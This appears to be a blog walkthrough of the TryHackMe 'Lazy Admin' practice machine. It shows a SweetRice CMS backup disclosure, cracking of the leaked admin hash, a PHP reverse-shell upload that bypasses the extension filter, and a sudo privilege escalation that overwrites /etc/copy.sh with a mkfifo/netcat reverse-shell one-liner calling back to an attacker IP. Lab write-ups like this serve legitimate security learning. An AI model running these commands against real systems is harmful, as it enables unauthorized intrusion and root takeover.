---
title: TryHackMe - Lazy Admin
layout: post
categories:
- TryHackMe
tag: security, linux
image: "/assets/img/lazy-admin.jpeg"
image_alt: lazy-admin
---

Easy linux machine to practice your skills

<br>

## 1. Lazy Admin     

Have some fun! There might be multiple ways to get user access.

<br>

### 1.1 What is the user flag?

Let's do a nmap scan.

```
$ nmap -sSCV 10.10.221.70
```

![nmap](/assets/img/tryhackme/lazy-admin/nmap.png)

Two ports are open. These are **`22/tcp SSH and 80/tcp HTTP`**. 

Let's visit the website running on `80/tcp` port. 

I see an apache default page on the website.

![apache](/assets/img/tryhackme/lazy-admin/apache.png)

Let's do a `gobuster` scan for the website.

```
$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster-one](/assets/img/tryhackme/lazy-admin/gobuster-one.png)

We found the  `/content/` directory. Let's go to the directory. 

![content](/assets/img/tryhackme/lazy-admin/content.png)

This website uses `SweetRice` and it seems to be closed. 

So, I try another gobuster scan on this directory.

```
$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster-content](/assets/img/tryhackme/lazy-admin/gobuster-content.png)

We found a few directories here. Let's examine all directories.

 - _**`/inc/`**_ 
 
	  We found a lot of files in this directory.
     
    ![inc](/assets/img/tryhackme/lazy-admin/inc.png)

    I found lastest.txt. It seems `SweetRice's` running version is `1.5.1.` Maybe this version is vulnerable.

    ![lastest](/assets/img/tryhackme/lazy-admin/lastest.png)

 - _**`/as/`**_
    
	  We found a login page here. 
    
    ![as](/assets/img/tryhackme/lazy-admin/as.png)

<br>

I searched SweetRice in [exploit-db](https://www.exploit-db.com/).  

![search](/assets/img/tryhackme/lazy-admin/search.png)

I am looking to the first. [SweetRice 1.5.1 - Backup Disclosure](https://www.exploit-db.com/exploits/40718)

![first](/assets/img/tryhackme/lazy-admin/first.png)

According to the vulnerability, there is a msql_backup file under the /inc/ directory.

![say](/assets/img/tryhackme/lazy-admin/say.png)

Let's go and see. 

![back](/assets/img/tryhackme/lazy-admin/back.png)

Let's go to the /mysql_backup/ directory.

![sql-file](/assets/img/tryhackme/lazy-admin/sql-file.png)

Let's see what's inside this file.

```
$ cat mysql_bakup_20191129023059-1.5.1.sql
```

![sql-inside](/assets/img/tryhackme/lazy-admin/sql-inside.png)

We found two important things here.

_**`Admin: manager`**_

_**`Passwd: 42f749ade7f9e195bf475f37a44cafcb`**_

It seems the password is a hash. Let's identify and crack this hash.

![hash-id](/assets/img/tryhackme/lazy-admin/hash-id.png)

This password is encrypted using **`MD5`**.

Let's crack. [https://md5decrypt.net/](https://md5decrypt.net/)

![crack-hash](/assets/img/tryhackme/lazy-admin/crack-hash.png)

_**`Passwd: Password123`**_

Now we can log in as an admin user. Let's go to the /as/ directory and log in.

![home](/assets/img/tryhackme/lazy-admin/home.png)

Now we can upload a reverse shell. So, I download pentest monkey's [php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and edit the php file. `($ip and $port)`

Then we go to the Post > Create 

![post-create](/assets/img/tryhackme/lazy-admin/post-create.png)

After, we can add a file below the page. (.php file isn't working you must change the extension.)

![below](/assets/img/tryhackme/lazy-admin/below.png)

After the upload, the page looks like this.

![upload](/assets/img/tryhackme/lazy-admin/upload.png)

Now, we set up a netcat listener.

```
$ nc -nlvp 4444 
```

Then we go to the [http://10.10.103.31/content/attachment/shell.phtml](http://10.10.103.31/content/attachment/shell.phtml)

And we are inside.

![inside](/assets/img/tryhackme/lazy-admin/inside.png)

Now, let's get to the user flag.

![user-flag](/assets/img/tryhackme/lazy-admin/user-flag.png)

<br>

### 1.2 What is the root flag?

Very surprisingly for www-data, we have sudo privileges.

```
$ sudo -l
```

![sudo-l](/assets/img/tryhackme/lazy-admin/sudo-l.png)

The backup script is a Perl script that calls /etc/copy.sh

![copy](/assets/img/tryhackme/lazy-admin/copy.png)

Now we edit this copy.sh, file to get the root privilege. 

```
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.86.168 5555 >/tmp/f" > /etc/copy.sh 
```

Let's setup a netcat listener.

```
$ nc -nlvp 5555 
```

Let's run the backup.pl file and get the root privilege.

```
$ sudo perl /home/itguy/backup.pl
```

![privesc](/assets/img/tryhackme/lazy-admin/privesc.png)

We are inside. Let's get the root flag.

![root-flag](/assets/img/tryhackme/lazy-admin/root-flag.png)

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
